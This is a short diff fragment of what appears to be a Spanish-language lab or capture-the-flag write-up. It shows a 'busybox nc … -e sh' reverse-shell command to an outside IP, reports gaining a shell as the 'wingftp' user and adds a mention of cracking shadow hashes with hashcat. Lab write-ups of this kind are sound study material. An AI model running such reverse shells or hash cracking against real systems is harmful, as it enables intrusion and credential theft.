@@ -37,4 +37,4 @@ busybox nc 10.10.15.216 443 -e sh
 
 
 Obtenemos una shell como como el usuario `wingftp`
-shadow 256
+shadow 256 hashcat
